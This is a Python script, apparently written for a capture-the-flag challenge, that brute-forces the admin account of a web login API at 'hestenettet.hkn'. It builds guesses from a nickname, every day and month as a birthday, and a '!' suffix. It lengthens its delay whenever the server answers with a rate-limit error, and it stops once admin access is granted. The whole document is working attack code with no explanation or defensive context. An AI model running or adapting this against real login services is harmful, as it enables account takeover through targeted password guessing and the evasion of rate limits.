import aiohttp
import asyncio
import json
import string
import itertools

URL = "http://hestenettet.hkn"

CONCURRENT_LIMIT = 1
SEM = asyncio.Semaphore(CONCURRENT_LIMIT)

SLEEP_TIME = 10

async def login(username: str, password: str, session: aiohttp.ClientSession) -> tuple[bool, str]:
    data = {
        "usernameOrEmail": username,
        "password": password,
    }

    global SLEEP_TIME
    async with SEM:
        print(f"Trying password: {password}")
        while True:
            await asyncio.sleep(SLEEP_TIME)  # Simulate some delay
            async with session.post(URL + "/api/authentication/login", json=data) as response:
                #print(f"Response status: {response.status}")
                if response.status == 200:
                    print(f"Login successful with password: {password}")
                    if username == "admin":
                        print("Admin access granted!")
                        exit(0)
                    return True, password
                else:
                    if response.status == 429:
                        SLEEP_TIME += 1
                        print(f"Rate limit exceeded, sleeping for {SLEEP_TIME}...")
                    elif response.status == 401:
                        print(f"Login failed with status code: {response.status} - {await response.text()}")
                        return False, password
                    else:
                        print(f"Unexpected status code: {response.status} - {await response.text()}")
                        return False, password


async def bruteforce(username: str, session: aiohttp.ClientSession) -> None:
    nickname = "Prussenusen"
    suffix = "!"
    
    # Try all combinations of birthdays
    months = [f"{i:02d}" for i in range(1, 13)]
    days = [f"{i:02d}" for i in range(1, 32)]

    passwords = [
        f"{nickname}{day}{month}{suffix}"
        for month in months
        for day in days
    ]

    print(f"Trying {len(passwords)} birthday combinations...")
    # Use asyncio to run the login attempts concurrently
    tasks = asyncio.gather(
        *[login(username, password, session) for password in passwords]
    )
    results = await tasks
    for success, password in results:
        if success:
            print(f"Password found: {password}")
            return
    
    print("No valid password found in the birthday combinations.")

async def main():
    async with aiohttp.ClientSession() as session:
        success, _ = await login("Hero", "strongPassword!1", session)
        if not success:
            print("Login failed")
            return
        else:
            print("Test login successful")
        
        await bruteforce("admin", session)

if __name__ == "__main__":
    asyncio.run(main())